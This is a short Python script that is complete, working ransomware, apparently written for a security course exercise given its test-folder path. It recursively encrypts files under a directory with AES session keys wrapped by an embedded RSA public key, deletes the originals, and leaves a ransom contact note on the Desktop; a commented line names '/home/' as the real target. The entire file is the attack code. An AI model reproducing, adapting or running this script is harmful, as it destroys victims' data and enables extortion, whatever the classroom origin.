#!/usr/bin/python3
import base64
import os
import gc
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# public key with base64 encoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE0RnM2NlMvMVpZU3FGdklJK0tKcQp3b21GV1RLcUZXcXk5ajVrQUNWaEtlRHY3dlFPRjlBSWdLcmVXOWJUNHdHamczanI3TXllV1hYc3psTjkrRVc5ClZOWnR6R3BqTnV5RHFvMjZkWEZHb2o5bXZuZDhBeUttaTRseTBXbGx1MHMrYTlqVzZ2TmdBN0xWWnZWSElxU2cKNDl4cVIyanU0dUpJS1RFT0lQNHBWajJZdHBHN0xVTXhsUXhjYjc1b0V5QUJDMjg0emhwanBTUlloNndwckZRawpjMkF4c2FKS2F4UWpEbk0yaTFlc1BRMXAvdmdZbHN0cnBmd1ZVWnBZSnRtTHh2emg4bHhGZDd4Zk5PV0RNdy9SCnpKWWNKY2Q2UXJjaFhZMGcveUY5WkZ6QSs4UDZTbE5PcXlLZW5US0llZVA3ZC91bkJITVNpQndVQ0VyYW5yTmcKWVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)


def scan_recurse(base_dir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(base_dir):
        if entry.is_file():
            yield entry
        else:
            yield from scan_recurse(entry.path)

def encrypt(data_file, public_key, extension):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    data_file = str(data_file)
    with open(data_file, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(public_key)
    sessionKey = os.urandom(32)# size 128 bit
    #sessionKey = os.urandom(16)# size 128 bit

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encrypted_session_key = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext = cipher.encrypt(data)
    tag = cipher.digest()

    # remove session key from memory
    del sessionKey
    gc.collect()
    
    # save the encrypted data to file
    file_name = data_file.split(extension)[0]
    with open(file_name, 'wb') as f:
        data_to_write = [encrypted_session_key, cipher.nonce, tag, ciphertext]
        for data_chunk in data_to_write:
            f.write(data_chunk)

    os.remove(data_file)
    if extension:
        os.rename(file_name, file_name+extension)


#directory ='/home/' # real dir to use
#test dir
directory ='/home/marcelo/Documents/infosec/ex2/TestRansomware/'
exclude_extension = ['.pem', '.exe']

for item in scan_recurse(directory): 
    file_path = Path(item)
    fileType = file_path.suffix.lower()
    
    if fileType in exclude_extension:
        continue
    #print(str(file_path))   
    encrypt(file_path, pubKey, fileType)

def create_file_on_desktop(file_name, content):
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    file_path = os.path.join(desktop_path, file_name)

    with open(file_path, 'w') as file:
        file.write(content)

file_name = "RANSMOWARE-contact_info.txt"
file_content = "Contact xyz@xyz.com"

create_file_on_desktop(file_name, file_content)